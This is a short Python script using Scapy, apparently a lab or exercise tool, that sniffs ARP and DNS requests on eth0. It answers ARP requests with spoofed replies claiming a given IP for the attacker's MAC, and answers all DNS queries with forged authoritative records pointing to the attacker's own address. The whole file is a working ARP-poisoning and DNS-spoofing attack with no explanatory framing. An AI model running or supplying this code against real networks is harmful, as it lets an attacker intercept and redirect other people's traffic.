#!/usr/bin/python3
from scapy.all import *
import netifaces as ni
import uuid

# Our eth0 IP
ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
# Our eth0 mac address
macaddr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])

def handle_packets(packet):
    if ARP in packet and packet[ARP].op == 1:
        print("Handling ARP request\n")
        ether_resp = Ether(dst=packet[ARP].hwsrc, type=0x806, src=macaddr)
        arp_response = ARP(
          op = 2,
          plen = 4,
          hwlen = 6,
          ptype = 0x0800,
          hwtype = 1,
          hwsrc = macaddr ,
          psrc = sys.argv[1],
          hwdst = packet[ARP].hwsrc,
          pdst = packet[ARP].psrc
        )
        response = ether_resp/arp_response
        sendp(response, iface="eth0")

    if DNS in packet and packet[DNS].qr == 0:
        print("Handling DNS request\n")
        eth = Ether(src=packet[Ether].dst,dst=packet[Ether].src)
        ip  = IP(dst=packet[IP].src, src=packet[IP].dst)
        udp = UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)
        dns = DNS(
          id=packet[DNS].id, aa=1, qr=1,
          rd=packet[DNS].rd,
          qdcount=packet[DNS].qdcount, qd=packet[DNS].qd,
          ancount=1, an=DNSRR(rrname=packet[DNS].qd.qname,type='A',ttl=10,rdata=ipaddr)
        )
        dns_response = eth / ip / udp / dns
        sendp(dns_response, iface="eth0")

def main():
    # We only want ARP and DNS requests
    berkeley_packet_filter = "(arp[6:2] = 1) or (udp dst port 53 and udp[10] & 0x80 = 0)"
    # sniffing for one packet that will be sent to a function, while storing none
    sniff(filter=berkeley_packet_filter, prn=handle_packets, store=0, count=10)

if __name__ == "__main__":
    main()
